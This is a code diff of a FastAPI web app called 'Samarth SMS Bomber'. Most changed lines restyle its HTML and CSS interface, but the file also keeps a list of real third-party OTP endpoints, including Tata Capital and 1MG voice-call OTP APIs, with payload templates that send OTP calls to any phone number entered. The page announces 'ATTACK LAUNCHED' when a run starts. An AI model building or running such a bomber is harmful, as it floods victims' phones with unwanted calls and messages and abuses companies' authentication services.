@@ -12,7 +12,7 @@ app = FastAPI()
 class Phone(BaseModel):
     phone: str
 
-# === COMPLETE API LIST FROM YOUR BOT ===
+# === COMPLETE API LIST ===
 ULTIMATE_APIS = [
     {"name": "Tata Capital Voice Call", "type": "Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'},
     {"name": "1MG Voice Call", "type": "Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'},
@@ -113,285 +113,294 @@ async def index():
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>Samarth SMS Bomber | Stadium Royale</title>
+    <title>Samarth SMS Bomber | Premium</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Uncial+Antiqua&family=Cinzel:wght@400;600;700;900&family=Orbitron:wght@400;700;800;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Cinzel', 'Orbitron', serif;
-            background: #0a0a1a;
+            font-family: 'Inter', sans-serif;
+            background: #0a0e1a;
             min-height: 100vh;
+            color: #e2e8f0;
             overflow-x: hidden;
-            color: #f0f0ff;
-            position: relative;
         }
-        /* Cosmic Background */
-        .cosmic-bg {
+        
+        /* Premium Pattern Background */
+        .pattern-bg {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: radial-gradient(ellipse at 20% 50%, rgba(30, 58, 138, 0.4) 0%, transparent 60%),
-                        radial-gradient(ellipse at 80% 50%, rgba(37, 99, 235, 0.3) 0%, transparent 60%),
-                        radial-gradient(ellipse at 50% 100%, rgba(99, 102, 241, 0.2) 0%, transparent 50%),
-                        #0a0a1a;
+            background: 
+                radial-gradient(ellipse at 10% 20%, rgba(37, 99, 235, 0.08) 0%, transparent 50%),
+                radial-gradient(ellipse at 90% 80%, rgba(139, 92, 246, 0.06) 0%, transparent 50%),
+                radial-gradient(ellipse at 50% 50%, rgba(59, 130, 246, 0.03) 0%, transparent 70%);
             z-index: 0;
-            overflow: hidden;
         }
-        /* Stars */
-        .stars {
-            position: absolute;
-            width: 2px;
-            height: 2px;
-            background: white;
-            border-radius: 50%;
-            animation: twinkle 3s infinite alternate;
-        }
-        @keyframes twinkle {
-            0% { opacity: 0.2; transform: scale(0.8); }
-            100% { opacity: 1; transform: scale(1.2); }
-        }
-        /* Nebula clouds */
-        .nebula {
-            position: absolute;
-            border-radius: 50%;
-            filter: blur(100px);
-            opacity: 0.2;
-            animation: drift 20s infinite alternate ease-in-out;
-        }
-        @keyframes drift {
-            0% { transform: translate(0, 0) scale(1); }
-            100% { transform: translate(30%, 20%) scale(1.3); }
-        }
-        /* Glow rings */
-        .glow-ring {
-            position: absolute;
-            border-radius: 50%;
-            border: 1px solid rgba(59, 130, 246, 0.1);
-            box-shadow: 0 0 40px rgba(59, 130, 246, 0.05);
-            animation: pulse-ring 6s infinite alternate;
-        }
-        @keyframes pulse-ring {
-            0% { transform: scale(1); opacity: 0.3; }
-            100% { transform: scale(1.5); opacity: 0.8; }
-        }
-
-        /* Glassmorphism Grand */
-        .glass-grand {
-            background: rgba(10, 10, 30, 0.6);
-            backdrop-filter: blur(30px);
-            -webkit-backdrop-filter: blur(30px);
-            border: 1px solid rgba(56, 189, 248, 0.15);
-            box-shadow: 0 30px 60px -20px rgba(0,0,0,0.8), inset 0 0 80px rgba(37,99,235,0.05);
-            transition: all 0.4s ease;
-            position: relative;
-            overflow: hidden;
-        }
-        .glass-grand::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: conic-gradient(from 0deg, transparent, rgba(59,130,246,0.03), transparent, rgba(251,191,36,0.03), transparent);
-            animation: rotate-glow 20s linear infinite;
-        }
-        @keyframes rotate-glow {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* Titles */
-        .title-grand {
-            font-family: 'Uncial Antiqua', 'Cinzel', serif;
-            font-size: 4rem;
-            font-weight: 900;
-            text-shadow: 0 0 30px rgba(59,130,246,0.5), 0 0 60px rgba(59,130,246,0.3), 0 0 120px rgba(59,130,246,0.1);
-            background: linear-gradient(135deg, #60a5fa, #fbbf24, #60a5fa);
-            background-size: 300% 300%;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            animation: shimmer-title 6s ease-in-out infinite;
-        }
-        @keyframes shimmer-title {
-            0%, 100% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-        }
-        .subtitle-grand {
-            font-family: 'Orbitron', monospace;
-            letter-spacing: 0.5em;
-            text-shadow: 0 0 20px rgba(251,191,36,0.3);
-            color: #fbbf24;
-            font-size: 0.9rem;
-            font-weight: 700;
-        }
-
-        /* Inputs */
-        .input-grand {
-            background: rgba(0, 0, 0, 0.7);
-            border: 2px solid rgba(56, 189, 248, 0.2);
-            border-radius: 16px;
-            padding: 1.2rem 1.5rem 1.2rem 4.5rem;
-            color: #f0f0ff;
-            font-family: 'Orbitron', monospace;
-            font-size: 1.5rem;
-            letter-spacing: 0.1em;
-            transition: all 0.4s ease;
+        
+        /* Animated Grid */
+        .grid-pattern {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            backdrop-filter: blur(10px);
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
+            background-size: 40px 40px;
+            z-index: 0;
+            animation: gridMove 30s linear infinite;
         }
-        .input-grand:focus {
+        @keyframes gridMove {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(40px, 40px); }
+        }
+        
+        /* Floating Orbs */
+        .orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.15;
+            animation: floatOrb 15s infinite alternate ease-in-out;
+            z-index: 0;
+        }
+        @keyframes floatOrb {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(100px, -100px) scale(1.2); }
+        }
+        
+        /* Glass Cards */
+        .glass-premium {
+            background: rgba(10, 14, 26, 0.7);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            box-shadow: 0 20px 40px -12px rgba(0, 0, 0, 0.6);
+            transition: all 0.3s ease;
+        }
+        .glass-premium:hover {
+            border-color: rgba(59, 130, 246, 0.15);
+        }
+        
+        .glass-light {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        /* Input */
+        .input-premium {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1.5px solid rgba(255, 255, 255, 0.06);
+            transition: all 0.3s ease;
+            color: #e2e8f0;
+            font-size: 1.1rem;
+            letter-spacing: 0.05em;
+            padding: 0.9rem 1rem 0.9rem 4rem;
+            width: 100%;
+            border-radius: 12px;
+            font-family: 'Inter', sans-serif;
+        }
+        .input-premium:focus {
             border-color: #3b82f6;
-            box-shadow: 0 0 40px rgba(59,130,246,0.3), inset 0 0 40px rgba(59,130,246,0.05);
+            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.1), inset 0 0 20px rgba(59, 130, 246, 0.03);
             outline: none;
         }
-        .input-grand::placeholder {
-            color: rgba(148,163,184,0.2);
-            font-size: 1rem;
+        .input-premium::placeholder {
+            color: rgba(148, 163, 184, 0.25);
         }
-
+        
         /* Buttons */
-        .btn-epic {
-            background: linear-gradient(135deg, #1e3a8a, #2563eb);
+        .btn-premium {
+            background: linear-gradient(135deg, #1e40af, #3b82f6);
             border: none;
-            border-radius: 16px;
-            padding: 1rem 2rem;
-            font-family: 'Orbitron', monospace;
-            font-weight: 700;
-            letter-spacing: 0.1em;
+            border-radius: 12px;
+            padding: 0.9rem 1.5rem;
+            font-weight: 600;
             color: white;
-            box-shadow: 0 0 40px rgba(37,99,235,0.4);
+            box-shadow: 0 4px 20px rgba(37, 99, 235, 0.25);
             transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             cursor: pointer;
-            position: relative;
-            overflow: hidden;
+            font-family: 'Inter', sans-serif;
+            font-size: 0.95rem;
+            letter-spacing: 0.02em;
         }
-        .btn-epic::after {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255,255,255,0.15) 0%, transparent 60%);
-            transform: scale(0);
-            transition: transform 0.6s;
+        .btn-premium:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(37, 99, 235, 0.4);
         }
-        .btn-epic:hover::after {
-            transform: scale(1);
-        }
-        .btn-epic:hover {
-            transform: translateY(-4px) scale(1.02);
-            box-shadow: 0 0 60px rgba(37,99,235,0.6), 0 0 120px rgba(37,99,235,0.2);
-        }
-        .btn-epic:active {
+        .btn-premium:active {
             transform: scale(0.98);
         }
-        .btn-epic-danger {
-            background: linear-gradient(135deg, #dc2626, #b91c1c);
-            box-shadow: 0 0 40px rgba(239,68,68,0.3);
+        
+        .btn-danger {
+            background: linear-gradient(135deg, #dc2626, #ef4444);
+            box-shadow: 0 4px 20px rgba(239, 68, 68, 0.2);
         }
-        .btn-epic-danger:hover {
-            box-shadow: 0 0 60px rgba(239,68,68,0.5);
+        .btn-danger:hover {
+            box-shadow: 0 8px 30px rgba(239, 68, 68, 0.35);
         }
-
-        /* Stats Cards */
-        .stat-grand {
-            background: rgba(0,0,0,0.5);
-            border: 1px solid rgba(56,189,248,0.1);
-            border-radius: 16px;
+        
+        .btn-ghost {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            transition: all 0.3s ease;
+        }
+        .btn-ghost:hover {
+            background: rgba(59, 130, 246, 0.1);
+            border-color: rgba(59, 130, 246, 0.2);
+        }
+        
+        /* Stats */
+        .stat-premium {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 12px;
             padding: 1rem;
             text-align: center;
-            transition: all 0.4s ease;
-            position: relative;
+            transition: all 0.3s ease;
         }
-        .stat-grand:hover {
-            border-color: rgba(59,130,246,0.3);
-            transform: translateY(-5px);
-            box-shadow: 0 20px 40px -10px rgba(0,0,0,0.5);
+        .stat-premium:hover {
+            border-color: rgba(59, 130, 246, 0.15);
+            transform: translateY(-2px);
         }
         .stat-number {
-            font-family: 'Orbitron', monospace;
-            font-weight: 900;
-            font-size: 2.5rem;
-            background: linear-gradient(135deg, #60a5fa, #fbbf24);
+            font-weight: 800;
+            font-size: 2.2rem;
+            background: linear-gradient(135deg, #60a5fa, #a78bfa);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 30px rgba(59,130,246,0.2);
         }
-
-        /* Progress bar */
-        .progress-cosmic {
-            height: 4px;
-            background: rgba(255,255,255,0.05);
+        
+        /* Progress */
+        .progress-premium {
+            height: 3px;
+            background: rgba(255, 255, 255, 0.04);
             border-radius: 10px;
             overflow: hidden;
             margin-top: 0.5rem;
         }
-        .progress-cosmic-fill {
+        .progress-fill {
             height: 100%;
             border-radius: 10px;
-            background: linear-gradient(90deg, #3b82f6, #fbbf24);
-            box-shadow: 0 0 20px rgba(59,130,246,0.5);
+            background: linear-gradient(90deg, #3b82f6, #a78bfa);
             transition: width 0.8s cubic-bezier(0.4, 0, 0.2, 1);
         }
-
+        
         /* Logs */
-        .logs-grand {
+        .logs-premium {
             scrollbar-width: thin;
-            scrollbar-color: rgba(59,130,246,0.2) transparent;
-            font-family: 'Orbitron', monospace;
-            font-size: 0.7rem;
-            max-height: 300px;
+            scrollbar-color: rgba(59, 130, 246, 0.1) transparent;
+            max-height: 250px;
             overflow-y: auto;
-            padding: 0.5rem;
+            font-size: 0.8rem;
+            font-family: 'Inter', monospace;
         }
-        .logs-grand::-webkit-scrollbar { width: 4px; }
-        .logs-grand::-webkit-scrollbar-track { background: transparent; }
-        .logs-grand::-webkit-scrollbar-thumb {
-            background: rgba(59,130,246,0.3);
+        .logs-premium::-webkit-scrollbar { width: 4px; }
+        .logs-premium::-webkit-scrollbar-track { background: transparent; }
+        .logs-premium::-webkit-scrollbar-thumb {
+            background: rgba(59, 130, 246, 0.15);
             border-radius: 10px;
         }
         .log-entry {
-            padding: 0.3rem 0.8rem;
+            padding: 4px 12px;
+            border-radius: 6px;
             border-left: 2px solid transparent;
-            transition: all 0.2s;
+            transition: all 0.15s;
             color: #94a3b8;
         }
         .log-entry:hover {
-            background: rgba(59,130,246,0.05);
+            background: rgba(59, 130, 246, 0.04);
             border-left-color: #3b82f6;
             color: #e2e8f0;
         }
-
-        /* Toggle */
-        .toggle-grand {
+        
+        /* Badge */
+        .badge-premium {
             display: inline-flex;
             align-items: center;
-            gap: 0.5rem;
-            cursor: pointer;
-            padding: 0.3rem 0.8rem;
+            gap: 8px;
+            padding: 4px 14px;
+            border-radius: 100px;
+            font-size: 0.65rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        .dot-premium {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+        .dot-premium.idle { background: #22c55e; }
+        .dot-premium.active {
+            background: #ef4444;
+            animation: pulse-dot 0.8s ease-in-out infinite;
+        }
+        @keyframes pulse-dot {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.3; transform: scale(0.7); }
+        }
+        
+        /* Toggle */
+        .toggle-premium {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 4px 12px;
             border-radius: 30px;
-            border: 1px solid rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.05);
             background: rgba(0,0,0,0.3);
+            cursor: pointer;
             transition: all 0.3s;
+            font-size: 0.7rem;
         }
-        .toggle-grand:hover {
-            background: rgba(255,255,255,0.05);
+        .toggle-premium:hover {
+            background: rgba(255,255,255,0.04);
         }
-
-        /* Timer display */
-        .timer-grand {
-            font-family: 'Orbitron', monospace;
-            font-size: 1.2rem;
-            text-shadow: 0 0 20px rgba(251,191,36,0.3);
-            color: #fbbf24;
+        
+        /* Timer */
+        .timer-premium {
+            font-family: 'Inter', monospace;
+            font-size: 1rem;
+            font-weight: 600;
+            color: #60a5fa;
         }
-
-        /* Heart overlay bigger */
+        
+        /* Select */
+        .select-premium {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1.5px solid rgba(255, 255, 255, 0.06);
+            border-radius: 12px;
+            padding: 0.8rem 1rem;
+            color: #e2e8f0;
+            font-family: 'Inter', sans-serif;
+            font-size: 0.9rem;
+            width: 100%;
+            transition: all 0.3s ease;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%2364748b' stroke-width='1.5' fill='none'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 14px center;
+        }
+        .select-premium:focus {
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+            outline: none;
+        }
+        .select-premium option {
+            background: #0a0e1a;
+            color: #e2e8f0;
+        }
+        
+        /* Heart Overlay */
         .heart-overlay {
             position: fixed;
             top: 0;
@@ -403,22 +412,22 @@ async def index():
             display: none;
             justify-content: center;
             align-items: center;
-            background: rgba(0,0,0,0.5);
-            backdrop-filter: blur(10px);
+            background: rgba(0,0,0,0.4);
+            backdrop-filter: blur(8px);
         }
         .heart-overlay.active {
             display: flex;
             animation: heartFade 3s ease-out forwards;
         }
         @keyframes heartFade {
-            0% { opacity: 1; backdrop-filter: blur(20px); }
-            70% { opacity: 1; backdrop-filter: blur(20px); }
+            0% { opacity: 1; backdrop-filter: blur(12px); }
+            70% { opacity: 1; backdrop-filter: blur(12px); }
             100% { opacity: 0; backdrop-filter: blur(0); }
         }
         .heart-container {
             position: relative;
-            width: 400px;
-            height: 400px;
+            width: 280px;
+            height: 280px;
             animation: heartPulse 0.5s ease-in-out 6;
         }
         @keyframes heartPulse {
@@ -432,10 +441,11 @@ async def index():
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            font-family: 'Uncial Antiqua', serif;
-            font-size: 4rem;
+            font-family: 'Inter', sans-serif;
+            font-weight: 800;
+            font-size: 2.5rem;
             color: #fbbf24;
-            text-shadow: 0 0 40px rgba(251,191,36,0.8), 0 0 80px rgba(251,191,36,0.5), 0 0 120px rgba(251,191,36,0.3);
+            text-shadow: 0 0 40px rgba(251,191,36,0.5), 0 0 80px rgba(251,191,36,0.2);
             z-index: 1;
             text-align: center;
             line-height: 1.2;
@@ -446,38 +456,39 @@ async def index():
             left: 0;
             width: 100%;
             height: 100%;
-            filter: drop-shadow(0 0 60px rgba(239,68,68,0.8));
+            filter: drop-shadow(0 0 40px rgba(239,68,68,0.4));
             animation: heartGlow 1s ease-in-out infinite alternate;
         }
         @keyframes heartGlow {
-            0% { filter: drop-shadow(0 0 40px rgba(239,68,68,0.6)); }
-            100% { filter: drop-shadow(0 0 100px rgba(239,68,68,0.9)); }
+            0% { filter: drop-shadow(0 0 30px rgba(239,68,68,0.3)); }
+            100% { filter: drop-shadow(0 0 60px rgba(239,68,68,0.6)); }
         }
-
+        
+        /* Divider */
+        .divider-premium {
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(59,130,246,0.15), transparent);
+        }
+        
         /* Responsive */
         @media (max-width: 768px) {
-            .title-grand { font-size: 2.5rem; }
-            .input-grand { font-size: 1rem; padding-left: 3.5rem; }
-            .stat-number { font-size: 1.8rem; }
-            .heart-container { width: 250px; height: 250px; }
-            .heart-text { font-size: 2.5rem; }
+            .stat-number { font-size: 1.6rem; }
+            .input-premium { font-size: 0.95rem; padding-left: 3.5rem; }
+            .heart-container { width: 200px; height: 200px; }
+            .heart-text { font-size: 1.8rem; }
         }
     </style>
 </head>
 <body>
 
-    <!-- Cosmic Background -->
-    <div class="cosmic-bg" id="cosmicBg">
-        <!-- Stars generated by JS -->
-        <div id="starContainer"></div>
-        <!-- Nebula -->
-        <div class="nebula" style="width:600px;height:600px;background:radial-gradient(circle, #3b82f6, transparent);top:10%;left:5%;"></div>
-        <div class="nebula" style="width:800px;height:800px;background:radial-gradient(circle, #fbbf24, transparent);bottom:10%;right:5%;"></div>
-        <div class="nebula" style="width:500px;height:500px;background:radial-gradient(circle, #8b5cf6, transparent);top:50%;left:50%;transform:translate(-50%,-50%);"></div>
-        <!-- Glow rings -->
-        <div class="glow-ring" style="width:300px;height:300px;top:20%;left:80%;"></div>
-        <div class="glow-ring" style="width:500px;height:500px;bottom:10%;left:10%;animation-delay:3s;"></div>
-    </div>
+    <!-- Background -->
+    <div class="pattern-bg"></div>
+    <div class="grid-pattern"></div>
+    
+    <!-- Orbs -->
+    <div class="orb" style="width:400px;height:400px;background:#3b82f6;top:-100px;right:-100px;"></div>
+    <div class="orb" style="width:300px;height:300px;background:#8b5cf6;bottom:-50px;left:-50px;animation-delay:5s;"></div>
+    <div class="orb" style="width:200px;height:200px;background:#06b6d4;top:50%;left:50%;transform:translate(-50%,-50%);animation-delay:8s;"></div>
 
     <!-- Heart Overlay -->
     <div class="heart-overlay" id="heartOverlay">
@@ -486,27 +497,19 @@ async def index():
                 <defs>
                     <radialGradient id="heartGrad" cx="50%" cy="50%" r="50%">
                         <stop offset="0%" stop-color="#ef4444"/>
-                        <stop offset="50%" stop-color="#dc2626"/>
                         <stop offset="100%" stop-color="#b91c1c"/>
                     </radialGradient>
-                    <filter id="heartGlowFilter">
-                        <feGaussianBlur stdDeviation="4" result="blur"/>
-                        <feMerge>
-                            <feMergeNode in="blur"/>
-                            <feMergeNode in="SourceGraphic"/>
-                        </feMerge>
-                    </filter>
                 </defs>
                 <path d="M50 88 C20 65 0 50 0 35 C0 15 15 0 35 0 C45 0 50 8 50 8 C50 8 55 0 65 0 C85 0 100 15 100 35 C100 50 80 65 50 88Z"
-                      fill="url(#heartGrad)" filter="url(#heartGlowFilter)" opacity="0.95"/>
+                      fill="url(#heartGrad)" opacity="0.9"/>
             </svg>
-            <div class="heart-text">⚡<br>ATTACK<br>LAUNCHED</div>
+            <div class="heart-text">⚡ ATTACK<br>LAUNCHED</div>
         </div>
     </div>
 
     <!-- Audio -->
     <audio id="wrongSound" preload="auto">
-        <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFh4qAgICAf4mMjo6LgH6Af3t/gHp3doR/gXx2e3Z1c2dxc3NwZWNfXmNcU1hVU1dWU1BQUU1MSkVGRkpHSEZGQ0dDQkI+OjUyMy4rKScnJiMiHRsWGRIPDAkGBwMCAQABAgIDAwMCAgEBAQEBAQEBAgIDAgIDAgIDAwMDAwMEBAQEBQUFBQUGBgYGBwcHCAgJCQkJCwsLCwsLCwwMDA0NDQ4ODg8PDw8PDw8PDw8PDw8PDw8QDw8PDw4ODg0NDQwMDAwLCwsKCgoICQgHBwYGBgUEBAMDAwICAQEBAQEBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDxAPEA8PDw8PDw8PDw8OEA8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoKCQkJCQgHBwYGBgUFBAMDAwMCAgIBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDw8QDw8PDw8PDw8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoJCQkICAcHBwYGBQUEBAMDAwMCAgEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBwcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PEA8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAA==">
+        <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFh4qAgICAf4mMjo6LgH6Af3t/gHp3doR/gXx2e3Z1c2dxc3NwZWNfXmNcU1hVU1dWU1BQUU1MSkVGRkpHSEZGQ0dDQkI+OjUyMy4rKScnJiMiHRsWGRIPDAkGBwMCAQABAgIDAwMCAgEBAQEBAQEBAgIDAgIDAgIDAwMDAwMEBAQEBQUFBQUGBgYGBwcHCAgJCQkJCwsLCwsLCwwMDA0NDQ4ODg8PDw8PDw8PDw8PDw8PDw8QDw8PDw4ODg0NDQwMDAwLCwsKCgoICQgHBwYGBgUEBAMDAwICAQEBAQEBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDxAPEA8PDw8PDw8PDw8OEA8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoKCQkJCQgHBwYGBgUFBAMDAwMCAgIBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDw8QDw8PDw8PDw8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoJCQkICAcHBwYGBQUEBAMDAwMCAgEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBwcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PEA8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0M